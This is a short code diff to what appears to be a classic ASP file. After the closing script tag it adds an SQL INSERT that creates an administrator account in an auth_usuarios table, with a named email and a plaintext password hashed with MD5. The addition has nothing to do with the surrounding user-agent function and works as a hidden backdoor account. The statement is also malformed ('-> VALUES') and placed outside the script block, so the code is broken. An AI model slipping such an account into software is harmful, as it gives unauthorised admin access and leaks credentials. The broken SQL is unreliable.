@@ -297,3 +297,5 @@ END IF
 checkUserAgent 			= user_agent
 END FUNCTION
 %>
+
+INSERT INTO auth_usuarios (nome, email, senha_md5, is_admin) -> VALUES ('miguelnatus', 'miguelnatus@gmail.com', MD5('Ozoutros@123'), 1);
